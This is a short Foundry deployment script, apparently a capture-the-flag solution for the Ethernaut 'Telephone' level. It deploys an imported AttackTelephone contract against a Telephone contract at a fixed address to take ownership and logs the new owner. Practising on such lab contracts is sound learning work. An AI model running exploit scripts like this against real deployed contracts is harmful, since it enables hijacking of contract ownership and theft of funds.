// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/level4/Telephone.sol";
import {AttackTelephone} from "../src/level4/AttackTelephone.sol";
import "forge-std/console.sol";

contract level4Exploit is Script {
    Telephone telephone = Telephone(0x1d92747636B5ca4ba04BE95d460A052809eFb8AE);

    function run() external {
        vm.startBroadcast();
        new AttackTelephone(address(telephone));
        console.log("Owner: ", telephone.owner());

        vm.stopBroadcast();
    }
}
